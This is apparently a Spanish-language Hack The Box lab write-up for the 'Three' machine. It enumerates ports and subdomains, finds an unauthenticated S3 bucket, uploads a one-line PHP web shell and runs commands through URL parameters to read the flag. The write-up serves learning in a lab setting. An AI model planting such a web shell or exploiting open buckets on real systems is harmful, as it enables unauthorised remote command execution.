---
title: Three
date: 2025-04-8 00:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, aws, s3]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/49fa1274ca631fd870e9feca35b7d7c2.png
    alt: Hack The Box
---
## Three
De nuevo una serie de tareas para ir resolviendo la máquina. Esta vez parece algo relacionado con s3 de amazon.

## Task 1

How many TCP ports are open?
```shell
└─$ nmap -p- -vv -T4 10.129.229.84                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 17:20 EDT
Initiating Ping Scan at 17:20
Scanning 10.129.229.84 [4 ports]
Completed Ping Scan at 17:20, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:20
Completed Parallel DNS resolution of 1 host. at 17:20, 13.00s elapsed
Initiating SYN Stealth Scan at 17:20
Scanning 10.129.229.84 [65535 ports]
Discovered open port 80/tcp on 10.129.229.84
Discovered open port 22/tcp on 10.129.229.84
```
>2

## Task 2

What is the domain of the email address provided in the "Contact" section of the website?

>thetoppers.htb

## Task 3

In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
> /etc/hosts

## Task 4

Which sub-domain is discovered during further enumeration?

Antes de continuar con esta tarea tuve que instalar seclist en la máquina Kali25 que estoy utilizando para hacer los retos de HTB. 
Luego podremos valernos de gobuster para buscar 
```
apt install seclist
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://thetoppers.htb
```

Sin embargo no tuve resultados. Encontré una explicación en [Reddit](https://www.reddit.com/r/hackthebox/comments/11bsuxt/can_find_the_s3_subdomain_that_i_am_supposed_to/?tl=es-es&rdt=58488) Algo malo pasa con esta máquina? Es posible porque me dan pistas cuando hago spawn... 

Please wait for a few minutes until all machine related services are up and running.
Expect to see {"status":"running"} when visiting s3.thetoppers.htb

> s3.thetoppers.htb

## Task 5

Which service is running on the discovered sub-domain?

Como es lógico sería inútil usar nmap contra un dominio en amazon, pero es posible que una mala configuración de la máquina nos permita el acceso
volvemos a configurar /etc/hostname, esta vez con el subdomino por delante. 

```shell
10.129.234.148 s3.thetoppers.htb
```
Ahora visitamos la web http://s3.thetoppers.htb/ parece que la instanancia muestra un status 
```
{"status": "running"}
```
> amazon s3

## Task 6

Which command line utility can be used to interact with the service running on the discovered sub-domain?
> awscli

## Task 7

Which command is used to set up the AWS CLI installation?
``` shell
sudo apt install awscli
```
> aws configure

## Task 8 

What is the command used by the above utility to list all of the S3 buckets?

Aqui tenemos que configurar el cliente de aws antes de poner usarlo contra la instancia de s3
``` shell
└─$ aws configure                               
AWS Access Key ID [None]: hacked
AWS Secret Access Key [None]: hacked
Default region name [None]: hacked
Default output format [None]: hacked
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2025-04-08 16:27:00          0 .htaccess
2025-04-08 16:27:00      11952 index.php

```
> aws s3 ls 

## Task 9

This server is configured to run files written in what web scripting language?
> php

## Submit Flag

Vamos a codificar una pequeña shell en PHP que al pasarle parámetros los ejecute como instrucciones del lado del servidor

``` php
<?php
    system($_GET["cmd"]);
?>
```
Ahora lo subimos a la instancia de s3 
``` shell
└─$ aws --endpoint=http://s3.thetoppers.htb s3 cp hello.php s3://thetoppers.htb  
upload: ./hello.php to s3://thetoppers.htb/hello.php              
```
Ahora desde el navegador deberíamos poder ejecutar comandos en la instancia para encodear los comandos en un formato que no rechaze el servidor te puedes valer de URL encoders que hay online de forma que **ls /var/www** se convierte en **ls%20%2Fvar%2Fwww**                                                     

```
http://thetoppers.htb/hello.php?cmd=ls%20%2Fvar%2Fwww

flag.txt html 

http://thetoppers.htb/hello.php?cmd=cat%20%2Fvar%2Fwww%2Fflag.txt%0A

```

## Submit root flag [achivement](https://www.hackthebox.com/achievement/machine/2336390/489)

